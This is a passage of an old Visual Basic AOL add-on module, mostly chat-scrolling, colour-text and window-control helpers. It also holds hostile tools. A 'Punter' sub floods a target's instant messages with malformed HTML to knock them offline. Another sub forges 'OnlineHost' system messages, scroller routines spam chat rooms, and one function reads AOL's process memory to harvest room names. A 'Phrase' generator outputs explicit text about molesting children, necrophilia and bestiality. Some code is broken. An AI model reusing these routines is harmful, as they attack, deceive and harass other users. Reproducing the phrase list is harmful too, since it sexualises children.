SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$
TimeOut 1.5
End Sub
Public Sub AOLFiveLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$
TimeOut 0.3
End Sub




Public Sub AOLSixTeenLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.7
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.7
End Sub

Public Function AOLSupRoom()
'used for a sup bot
If IsUserOnline = 0 Then GoTo last
FindChatRoom
If FindChatRoom = 0 Then GoTo last

On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
    

room = FindChatRoom()
aolhandle = FindChildByClass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For Index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(Index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal person$, 4)
ListPersonHold = ListPersonHold + 6

person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, person$, Len(person$), ReadBytes)

person$ = Left$(person$, InStr(person$, vbNullChar) - 1)
Call SendChat("HeY! " & person$ & " WaZ uP?")
TimeOut (0.5)
Next Index
Call CloseHandle(AOLProcessThread)
End If
last:
End Function

Public Sub AOLTenLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
End Sub

Public Sub AOLThirtyFiveLine(Txt As TextBox)
A = String(116, Chr(4))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$
TimeOut 0.3
End Sub

Public Sub AOLTwentyFiveLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + ""
TimeOut 1.5

End Sub


Public Sub AOLTwentyLine(Txt As TextBox)
A = String(116, Chr(32))
D = 116 - Len(Txt)
c$ = Left(A, D)
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 1.5
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
SendChat "" + Txt.text + "" & c$ & "" + Txt.text + ""
TimeOut 0.3
End Sub

Function ScrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Scrambles the text
For scrambling = 1 To Len(thetext)
DoEvents
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
ScrambleText = scrambled$

Exit Function
End Function
Function DescrambleText(thetext)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(thetext, Len(thetext), 1)

If Not findlastspace = " " Then
thetext = thetext & " "
Else
thetext = thetext
End If

'Descrambles the text
For scrambling = 1 To Len(thetext)
DoEvents
thechar$ = Mid(thetext, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo city
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
city:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
scrambled$ = scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = scrambled$

End Function


Sub Directory_Create(dir)
'This will add a directory to your system
'Example of what it should look like:
'Call Directory_Create("C:\My Folder\NewDir")
MkDir dir
End Sub

Sub Directory_Delete(dir)
'This deletes a directory automatically from your HD
RmDir (dir)
End Sub


Sub File_Delete(file)
'This will delete a file straight from the users HD
Kill (file)
End Sub
Sub File_Open(file)
'This will open a file... whole dir and file name needed
Shell (file)
End Sub
Sub File_ReName(sFromLoc As String, sToLoc As String)
'This will immediately rename a file for you
Name sOldLoc As sNewLoc
End Sub

Sub Window_Close(win)
'This will close and window of your choice
Dim X%
X% = SendMessage(win, WM_CLOSE, 0, 0)
End Sub

Sub Window_Hide(hWnd)
'This will hide the window of your choice
X = ShowWindow(hWnd, SW_HIDE)
End Sub



Sub Window_Show(hWnd)
'This will show the window of your choice
X = ShowWindow(hWnd, SW_SHOW)
End Sub

Sub AOL40_Load()
'This will load AOL4.0
X% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub

Sub PhreakyAttention(text)

SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
SendChat ("<B>" & text)
SendChat ("<I>" & text)
SendChat ("<U>" & text)
SendChat ("<S>" & text)
SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
End Sub

Sub Punter(text)
'this is a fun  punt string
' it is best to put it in a
'timer... Make sure u have a
'stop button or it will just keep goin
Dim Punt
Punt = "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
'that made it so I din't have
'to type as much shit below

Dim pu
pu = "<P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
Call IMKeyword(text, pu)
Call IMKeyword(text, Punt)

End Sub


Sub AOL4_Invite(person)
'This will send an Invite to a person
'werks good for a pinter if u use a timer
FreeProcess
On Error GoTo errhandler
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
bud% = FindChildByTitle(MDI%, "Buddy List Window")
e = FindChildByClass(bud%, "_AOL_Icon")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
ClickIcon (e)
TimeOut (1#)
Chat% = FindChildByTitle(MDI%, "Buddy Chat")
AOLEdit% = FindChildByClass(Chat%, "_AOL_Edit")
If Chat% Then GoTo FILL
FILL:
Call AOL4_SetText(AOLEdit%, person)
de = FindChildByClass(Chat%, "_AOL_Icon")
ClickIcon (de)
Killit% = FindChildByTitle(MDI%, "Invitation From:")
killwin (Killit%)
FreeProcess
errhandler:
Exit Sub
End Sub

Sub AOL4_SetText(win, Txt)
'This is usually used for an _AOL_Edit or RICHCNTL
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub





Function Saying()
'This will generate a random saying
'werks good for an 8 ball bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--Hmm.....ask again Later"
Case 2: SendChat "<B>-=8=--Yeah baby!"
Case 3: SendChat "<B>-=8=--YES!"
Case 4: SendChat "<B>-=8=--NO!"
Case 5: SendChat "<B>-=8=--It looks to be in your favor!"
Case 6: SendChat "<B>-=8=--If you only knew! };-)"
Case 7: SendChat "<B>-=8=--GUESS WHAT! I don't care"
Case Else: SendChat "<B>-=8=--Sorry! Not this time."
End Select
End Function
Function Saying2()
'This will generate a random saying
'werks good for a drug bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--U get a big fat <(((((Joint))))))>"
Case 2: SendChat "<B>-=8=--U get  Acid"
Case 3: SendChat "<B>-=8=--U get a  -----(  Needle  )--|"
Case 4: SendChat "<B>-=8=-- U get shrooms"
Case 5: SendChat "<B>-=8=-- Hehe U overdosed"
Case 6: SendChat "<B>-=8=--U get pills () to pop"
Case 7: SendChat "<B>-=8=--Fugg u u are a nark and get nuttin"
Case Else: SendChat "<B>-=8=-- U get a big fat Crack roc"
End Select
End Function
Function BoldBlack_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(f, f, f - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    BoldSendChat (Msg)
End Function



Function BoldYellowPinkYellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(78, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    BoldSendChat (Msg)
End Function

Function BoldWhitePurpleWhite(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    WhitePurpleWhite (Msg)
End Function

Function BoldLBlue_Green_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Green_LBlue (Msg)
End Function

Function BoldLBlue_Yellow_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Yellow_LBlue (Msg)
End Function

Function BoldPurple_LBlue_Purple()
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldDBlue_Black_DBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 450 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    BoldSendChat (Msg)
End Function

Function BoldDGreen_Black(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(0, f - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function



Function BoldLBlue_Orange(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Orange (Msg)
End Function



Function BoldLBlue_Orange_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LBlue_Orange_LBlue (Msg)
End Function

Function BoldLGreen_DGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 220 / A
        f = e * b
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LGreen_DGreen (Msg)
End Function

Function BoldLGreen_DGreen_LGreen(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    LGreen_DGreen_LGreen (Msg)
End Function

Function BoldLBlue_DBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 255 / A
        f = e * b
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
 BoldSendChat (Msg)
End Function

Function BoldLBlue_DBlue_LBlue(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
BoldSendChat (Msg)
End Function

Function BoldPinkOrange(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 200 / A
        f = e * b
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    BoldSendChat (Msg)
End Function

Function BoldPinkOrangePink(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 490 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 167, 510)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    BoldSendChat (Msg)
End Function

Function BoldPurpleWhite(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 200 / A
        f = e * b
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
    BoldSendChat (Msg)
End Function

Function BoldPurpleWhitePurple(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
  BoldSendChat (Msg)
End Function

Function BoldYellow_LBlue_Yellow(Text1)
    A = Len(Text1)
    For b = 1 To A
        c = Left(Text1, b)
        D = Right(c, 1)
        e = 510 / A
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(f, 255, 255 - f)
        h = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & h & ">" & D
    Next b
   BoldSendChat (Msg)
End Function
Function Phrase() As String

Randomize Timer
Select Case Int(Rnd * 15)
    Case 0: Phrase$ = "I LIKE TO "
    Case 1: Phrase$ = "I LOVE TO "
    Case 2: Phrase$ = "IT MAKES ME HORNY WHEN I "
    Case 3: Phrase$ = "MY ASSHOLE GETS WET WHEN I "
    Case 4: Phrase$ = "IT GIVES ME ANAL PLEASURE TO "
    Case 5: Phrase$ = "IT MAKES ME CUM WHEN I "
    Case 6: Phrase$ = "I MOAN WHEN I "
    Case 7: Phrase$ = "I CUM INTO MY ASSHOLE WHEN I "
    Case 8: Phrase$ = "I LOVE THE FEELING I GET WHEN I "
    Case 9: Phrase$ = "MY ANAL ROLLS JIGGLE WHEN I "
    Case 10: Phrase$ = "I INSERT MY PINKY INTO THE TIP OF MY PENIS SO I CAN "
    Case 11: Phrase$ = "I POSE AS A PRIEST JUST SO I CAN "
    Case 12: Phrase$ = "IT MAKES ME CUM IN MY PANTIES WHEN I "
    Case 13: Phrase$ = "I STICK MY THUMB UP MY ASS WHEN I "
    Case 14: Phrase$ = "ALL PAIN DISSAPPEARS WHEN I "
End Select
Select Case Int(Rnd * 19)
    Case 0: Phrase$ = Phrase$ + "FONDLE LITTLE BOYS"
    Case 1: Phrase$ = Phrase$ + "TOUCH LITTLE GIRLS"
    Case 2: Phrase$ = Phrase$ + "FINGER FUCK MY ASSHOLE"
    Case 3: Phrase$ = Phrase$ + "ANALY RAPE CHICKENS"
    Case 4: Phrase$ = Phrase$ + "ASS FUCK NUNS"
    Case 5: Phrase$ = Phrase$ + "MOLEST PRE SCHOOLERS"
    Case 6: Phrase$ = Phrase$ + "STRETCH THE ASSHOLES OF KINDERGARTENERS"
    Case 7: Phrase$ = Phrase$ + "HAVE A 5 YEAR OLD GIRL SUCK MY PENIS"
    Case 8: Phrase$ = Phrase$ + "LOOK AT OTHER MEN"
    Case 9: Phrase$ = Phrase$ + "TOUCH OTHER MENS PENIS'S AND THEN STROKE THEIR SHAFTS"
    Case 10: Phrase$ = Phrase$ + "MAKE WILD AND PASSIONATE LOVE TO OTHER MEN"
    Case 11: Phrase$ = Phrase$ + "FINGER MY MOTHERS CUNT"
    Case 12: Phrase$ = Phrase$ + "STRANGLE LITTLE BOYS THEN RAPE THEIR DEAD BODIES"
    Case 13: Phrase$ = Phrase$ + "GET INTO THE PANTS OF A 7 YEAR OLD GIRL"
    Case 14: Phrase$ = Phrase$ + "MOLEST STATUES OF GREAT AMERICAN HEROES"
    Case 15: Phrase$ = Phrase$ + "BUTT FUCK BILL CLINTON"
    Case 16: Phrase$ = Phrase$ + "SHOVE A BROOM STICK UP MY PET DOGS ASSHOLE"
    Case 17: Phrase$ = Phrase$ + "GO TO A PLAYGROUND AND MOLEST THE CHILDREN"
    Case 18: Phrase$ = Phrase$ + "BREAK IN A 5 YEAR OLDS PUSSY"
End Select
SickPhrase = Phrase$
End Function
Sub falling_form(frm As Form, steps As Integer)
'this is a pretty neat sub try
'it out and see what it does
On Error Resume Next
BgColor = frm.BackColor
frm.BackColor = RGB(0, 0, 0)
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = False
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / steps
Y = ((Screen.Height - frm.Height) - frm.Top) / steps
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub
Function AOLMDI()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLMDI = FindChildByClass(AOL%, "MDIClient")
End Function
Sub AOLSetText(win, Txt)
thetext% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub

Sub AOL4_UnUpChat()
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_RESTORE)
Call AOL4_SetFocus
End Sub
Public Sub AOLKillWindow(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub
Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub

Function AOLActivate()
X = GetCaption(AOLWindow)
AppActivate X
End Function
Function AOLWindow()
AOL% = FindWindow("AOL Frame25", vbNullString)
AOLWindow = AOL%
End Function






Function Mail_ClickForward()
X = FindOpenMail
If X = 0 Then GoTo last
AOLActivate
SendKeys "{TAB}"
AG:
TimeOut (0.2)
SendKeys " "
X = FindSendWin(2)
If X = 0 Then GoTo AG
last:
End Function

Sub AOLHostManipulator(what$)
'a good sub but kinda old style
'Example.... AOLHostManipulator "You are gay"
'This will make the online host say you are gay!
view% = FindChildByClass(AOLFindRoom(), "_AOL_View")
Buffy$ = Chr$(13) & Chr$(10) & "OnlineHost:" & Chr$(9) & "" & (what$) & ""
X% = SendMessageByString(view%, WM_SETTEXT, 0, Buffy$)
End Sub
Sub AOLGuideWatch()
'a good sub but kinda old style
Do
    Y = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo end_ad
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
X = InStr(LCase$(namez$), LCase$("guide"))
If X <> 0 Then
Call Keyword("PC")
MsgBox "A Guide had entered the room."
End If
Next Index%
end_ad:
Loop
End Sub
Sub AOLRunMenuByString(stringer As String)
Call RunMenuByString(stringer)
End Sub
Function AOLCountMail()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
AOLCountMail = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
TimeOut (7)
End If

mailwin = FindChildByTitle(AOLMDI, "New Mail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo last
Mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   namelen = SendMessage(Mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMessageByString(Mailtree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 TimeOut (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_CloseMail()
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
End Function

Function Mail_Out_CursorSet(mailIndex As String)
AOL% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(AOL%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(Mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function Mail_Out_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
TimeOut (7)
End If

mailwin = FindChildByTitle(AOLMDI, "Outgoing FlashMail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo last
Mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   namelen = SendMessage(Mailtree, LB_GETTEXTLEN, Counter, 0)
    Buffer$ = String$(namelen, 0)
    X = SendMessageByString(Mailtree, LB_GETTEXT, Counter, Buffer$)
    TabPos = InStr(Buffer$, Chr$(9))
    Buffer$ = Right$(Buffer$, (Len(Buffer$) - (TabPos)))
    Box.AddItem Buffer$
 TimeOut (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_MailCaption()
End Function

Function Mail_Out_MailCount()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
